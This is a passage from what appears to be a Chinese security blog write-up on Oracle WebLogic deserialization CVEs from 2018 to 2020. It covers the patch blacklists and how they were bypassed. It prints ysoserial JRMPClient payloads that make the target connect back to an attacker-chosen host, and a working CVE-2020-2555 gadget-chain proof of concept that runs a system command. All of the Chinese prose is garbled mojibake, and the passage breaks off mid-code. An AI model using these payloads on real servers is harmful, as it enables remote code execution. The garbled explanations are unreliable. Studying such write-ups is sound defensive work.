alt="image-20241126144606671"></p><p>ç»§ç»­å›åˆ°ObjectInputStream.readOrdinaryObjectï¼Œå…ˆæ˜¯newInstanceå®ä¾‹åŒ–HashMapï¼Œç„¶åè°ƒç”¨readSerialData</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126144919766.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126144919766.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241126144919766"></p><p>readSerialDataé‡Œä¼šè°ƒç”¨invokeReadObject</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126145304736.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126145304736.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241126145304736"></p><p>å…¶å®å°±æ˜¯åå°„è°ƒç”¨readObjectå•¦ï¼Œåˆ°è¿™å°±èƒ½è§¦å‘ååºåˆ—åŒ–é“¾</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126145343103.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126145343103.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241126145343103"></p><p>ä¸ºä»€ä¹ˆèƒ½æ‰“CCå‘¢ï¼Ÿweblogicè‡ªå¸¦äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126145554186.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126145554186.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241126145554186"></p><h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><p>åœ¨InboundMsgAbbrevçš„å­ç±»ServerChannelInputStreamé‡å†™äº†resolveProxyClass()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveProxyClass(String[] interfaces) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">   String[] arr$ = interfaces;</span><br><span class="line">   <span class="type">int</span> <span class="variable">len$</span> <span class="operator">=</span> interfaces.length;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">intf</span> <span class="operator">=</span> arr$[i$];</span><br><span class="line">      <span class="keyword">if</span>(intf.equals(<span class="string">&quot;java.rmi.registry.Registry&quot;</span>)) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Unauthorized proxy deserialization&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">super</span>.resolveProxyClass(interfaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯java.rmi.registry.Registryå°±æŠ›å‡ºå¼‚å¸¸ï¼Œå¦åˆ™æ‰§è¡Œçˆ¶ç±»çš„resolveProxyClass()</p><p>è¿™é‡Œåªé™åˆ¶äº†è¿œç¨‹å¯¹è±¡çš„java.rmi.registry.Registryæ¥å£ï¼Œè€Œä¸”è¿˜æ˜¯èµ°ä»£ç†æ‰èƒ½è¿›resolveProxyã€‚</p><ol><li><p>ä¸èµ°ä»£ç†ï¼ŒæŠŠysoserialçš„Proxyéƒ¨åˆ†åˆ æ‰</p></li><li><p>æ¢ä¸€ä¸ªè¿œç¨‹å¯¹è±¡æ¥å£ï¼Œä¸ç”¨java.rmi.registry.Registry</p></li></ol><p>å…·ä½“å®ç°çœ‹c0e3ä½¬ï¼š<a href="https://www.cnblogs.com/nice0e3/p/14296052.html">https://www.cnblogs.com/nice0e3/p/14296052.html</a></p><p>æˆ‘ç›´æ¥æŠ„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient1</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sep &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient1.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient1.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ”¹æ¥å£ysoserialä¸Šè‡ªå¸¦äº†</p><h2 id="CVE-2018-2893"><a href="#CVE-2018-2893" class="headerlink" title="CVE-2018-2893"></a>CVE-2018-2893</h2><p>è¡¥ä¸ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_CLASSES = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;</span>, <span class="string">&quot;org.codehaus.groovy.runtime.ConversionHandler&quot;</span>, <span class="string">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>, <span class="string">&quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;</span>, <span class="string">&quot;sun.rmi.server.UnicastRef&quot;</span>&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é»‘åå•åŠ äº†UnicastRefï¼Œä¸èƒ½å»ºç«‹RMIè¿æ¥äº†ï¼Œä¹Ÿå°±é˜»æ–­äº†ä¸Šé¢ä¸¤ç§æ”»å‡»æ–¹å¼ã€‚</p><p>å¯ä»¥å­¦ä¹ 0638çš„ç»•è¿‡æ–¹å¼ï¼ˆä¹Ÿæ˜¯å°è£…è¿›StreamMessageImplï¼‰ï¼ŒæŠŠGadgetå°è£…è¿›StreamMessageImplï¼Œä¸èµ°InboundMsgAbbrevä¹Ÿå°±ä¸ä¼šé‡åˆ°é»‘åå•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> weblogic.jms.common.StreamMessageImpl;</span><br><span class="line"><span class="keyword">import</span> ysoserial.Serializer;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">&quot;restriction&quot;</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="meta">@PayloadTest( harness=&quot;ysoserial.test.payloads.JRMPReverseConnectSMTest&quot;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.MBECHLER &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient3</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">streamMessageImpl</span><span class="params">(<span class="type">byte</span>[] object)</span> &#123;</span><br><span class="line">        <span class="type">StreamMessageImpl</span> <span class="variable">streamMessage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamMessageImpl</span>();</span><br><span class="line">        streamMessage.setDataBuffer(object, object.length);</span><br><span class="line">        <span class="keyword">return</span> streamMessage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">(<span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sep &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">objID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">tcpEndpoint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">unicastRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(objID, tcpEndpoint, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">remoteObjectInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(unicastRef);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> Proxy.newProxyInstance(JRMPClient3.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Registry.class &#125;, remoteObjectInvocationHandler);</span><br><span class="line">        <span class="keyword">return</span> streamMessageImpl(Serializer.serialize(object));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient3.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦weblogic éƒ¨åˆ†jarçš„ä¾èµ–</p><h2 id="CVE-2018-3248"><a href="#CVE-2018-3248" class="headerlink" title="CVE-2018-3248"></a>CVE-2018-3248</h2><p>è¡¥ä¸æ·»åŠ äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.rmi.activation.*</span><br><span class="line">sun.rmi.server.*</span><br><span class="line">java.rmi.server.RemoteObjectInvocationHandler</span><br><span class="line">java.rmi.server.UnicastRemoteObject</span><br></pre></td></tr></table></figure><p>å°è£…StreamMessageImpléœ€è¦ç”¨åˆ°RemoteObjectInvocationHandlerè¿œç¨‹ç±»ã€‚è¿œç¨‹æ¥å£å®ç°ç±»è¿˜å¿…é¡»ç»§æ‰¿UnicastRemoteObjectã€‚å¦å¤–ä¸€ä¸ªRMIæ¥å£ä¹Ÿè¢«å°æ‰äº†</p><p>è¿›è¡Œç»•è¿‡çš„ç±»ä¹Ÿå°±å¿…é¡»åƒRemoteObjectInvocationHandlerå’ŒUnicastRemoteObjectä¸€æ ·ï¼Œç»§æ‰¿RemoteObjectã€‚è¿™é‡Œé¢éšä¾¿é€‰ä¸€ä¸ªã€‚ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318152452024.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318152452024.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="CVE-2020-2555"><a href="#CVE-2020-2555" class="headerlink" title="CVE-2020-2555"></a>CVE-2020-2555</h2><p>ä¸»è¦æºäºcoherence.jarå­˜åœ¨èƒ½gadgetçš„ç±»ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318154342275.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318154342275.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ¼æ´çš„å…¥å£ç‚¹ä¸ºBadAttributeValueException.readObject()</p><ul><li>è°ƒç”¨é“¾ï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">* gadget:</span><br><span class="line">*      BadAttributeValueExpException.readObject()</span><br><span class="line">*          com.tangosol.util.filter.LimitFilter.toString()</span><br><span class="line">*              com.tangosol.util.extractor.ChainedExtractor.extract()</span><br><span class="line">*                  com.tangosol.util.extractor.ReflectionExtractor.extract()</span><br><span class="line">*                      Method.invoke()</span><br><span class="line">*                      ...</span><br><span class="line">*                      Runtime.getRuntime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>BadAttributeValueExpExceptionååºåˆ—åŒ–ä¼šè°ƒç”¨æŒ‡å®šå¯¹è±¡çš„toString()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318154807115.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318154807115.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¸ºä»€ä¹ˆtoStringå¯ä»¥è§¦å‘gadget?</p><p>è·Ÿç€è°ƒç”¨é“¾å…ˆçœ‹åˆ°RefletionExtractor#extract()ï¼Œé€šè¿‡ä¼ è¾“oTargetå¯¹è±¡ï¼Œåˆ©ç”¨findMethodè·å–å¯¹è±¡æŒ‡å®šå‚æ•°ï¼Œä½¿ç”¨invokeè¿›è¡Œäº†æ–¹æ³•è°ƒç”¨</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318161146002.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318161146002.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>readExternalåˆ°readObjectï¼Œå¹¶æ²¡æœ‰è°ƒç”¨extractï¼Œéœ€è¦æ‰¾ä¸ªä¸­é—´å•†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162012988.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162012988.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨com.tangosol.util.extractor.ChainedExtractor#extracté“¾å¼è°ƒç”¨äº†å‚æ•°å¯¹è±¡çš„extract</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162351777.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162351777.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ChainedExtractoræœ¬èº«ä¹Ÿæ— æ³•è°ƒç”¨extract</p><p><code>com.tangosol.util.filter.LimitFilter#toString()</code>å¯¹extract()è¿›è¡Œäº†è°ƒç”¨</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162738723.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162738723.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…¶ä¸­m_oAnchotTopå¯ä»¥ç”¨setterè®¾ç½®å±æ€§å€¼</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162930092.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162930092.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åˆå›åˆ°åˆšå¼€å§‹ï¼ŒBadAttributeValueExpExceptionååºåˆ—åŒ–ä¼šè°ƒç”¨æŒ‡å®šå¯¹è±¡çš„toString()ã€‚å°±æ„æˆäº†é“¾</p><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2020_2555</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        ReflectionExtractor[] reflectionExtractors = <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;null&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;calc&quot;</span>&#125;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedExtractor</span> <span class="variable">chainedExtractor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedExtractor</span>(reflectionExtractors);</span><br><span class="line">        <span class="type">LimitFilter</span> <span class="variable">limitFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LimitFilter</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">m_comparator</span> <span class="operator">=</span> limitFilter.getClass().getDeclaredField(<span class="string">&quot;m_comparator&quot;</span>);</span><br><span class="line">        m_comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        m_comparator.set(limitFilter, chainedExtractor);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">m_oAnchorTop</span> <span class="operator">=</span> limitFilter.getClass().getDeclaredField(<span class="string">&quot;m_oAnchorTop&quot;</span>);</span><br><span class="line">        m_oAnchorTop.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        m_oAnchorTop.set(limitFilter, Runtime.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, limitFilter);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;weblogic_2020_2551.ser&quot;</span>));</span><br><span class="line">            os.writeObject(badAttributeValueExpException);</span><br><span class="line">            os.close();</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;weblogic_2020_2551.ser&quot;</span>));</span><br><span class="line">            is.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç»“åˆT3æ‰“çš„è¯å°±æŠŠç”Ÿæˆçš„weblogic_2020_2551.serå­—èŠ‚ç æ‹¼åˆ°payloadé‡Œ</p><h4 id="æ‹“å±•"><a href="#æ‹“å±•" class="headerlink" title="æ‹“å±•"></a>æ‹“å±•</h4><p>BadAttributeValueExpExceptionåœ¨jdk7ä¸­æ²¡æœ‰toStringï¼Œä½†æ˜¯æœ‰compare()ï¼Œè€Œä¸”ChainedExtractoræ˜¯å®ç°äº†Comparatoræ¥å£çš„ï¼Œä»€ä¹ˆåŸç‰ˆCC2å‡ºç°äº†</p><p>åˆå§‹åŒ–ä¸€ä¸ªæ­£å¸¸çš„comparatorï¼Œaddååå°„ä¿®æ”¹m_aExtractor</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ReflectionExtractor</span> <span class="variable">reflectionExtractor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 